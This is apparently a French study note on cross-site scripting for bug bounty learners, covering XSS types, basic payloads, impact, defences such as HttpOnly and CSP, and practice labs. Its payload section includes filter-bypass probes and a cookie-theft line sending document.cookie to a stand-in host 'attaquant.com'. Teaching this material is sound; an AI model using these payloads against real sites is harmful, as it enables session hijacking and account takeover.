# 🌐 Cross Site Scripting (XSS)

## C'est quoi le XSS ?

Le XSS consiste à injecter du code JavaScript
malveillant dans une page web qui sera exécuté
dans le navigateur d'une victime.

## Les 3 types de XSS

### 1. Reflected XSS
Le script est reflété directement par le serveur :
```
Attaquant envoie un lien piégé à la victime
        ↓
Victime clique
        ↓
Le script s'exécute dans son navigateur
```

### 2. Stored XSS
Le script est stocké dans la base de données :
```
Attaquant injecte le script dans un commentaire
        ↓
Le script est stocké dans la base de données
        ↓
Tous les visiteurs qui chargent la page
sont touchés automatiquement 😏
```

### 3. DOM XSS
Le script manipule le DOM directement :
```
Le script modifie la page côté client
sans passer par le serveur
```

## Payloads de base

```javascript
# Test simple
<script>alert('XSS')</script>

# Vol de cookie
<script>document.location='http://attaquant.com/?c='+document.cookie</script>

# Alternative si script filtré
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

## Comment ça marche côté serveur/client

```
Tu entres : <script>alert('XSS')</script>
        ↓
Serveur renvoie ce texte dans la page HTML
        ↓
Navigateur voit une balise <script>
        ↓
Il exécute le JavaScript automatiquement !
```

## Impact en bug bounty

```
Vol de cookies de session
        ↓
Attaquant utilise le cookie
        ↓
Accès au compte de la victime sans mot de passe 😏
```

## Conditions pour que XSS soit possible

```
1. Input utilisateur acceptée par le site
2. Cette input est reflétée/stockée dans la réponse
3. Le site filtre pas le JavaScript
```

## Protection contre le XSS

```
Filtrer et encoder les inputs utilisateur
Flag HttpOnly sur les cookies → document.cookie inaccessible
Content Security Policy (CSP)
```

## Sévérité en bug bounty

```
Reflected XSS → High 🔴
Stored XSS    → Critical 🔴🔴
DOM XSS       → High 🔴
```

## Pratique

```
Mutillidae → OWASP Top 10 → A7 XSS
PortSwigger → Web Security Academy → XSS
```
```

---

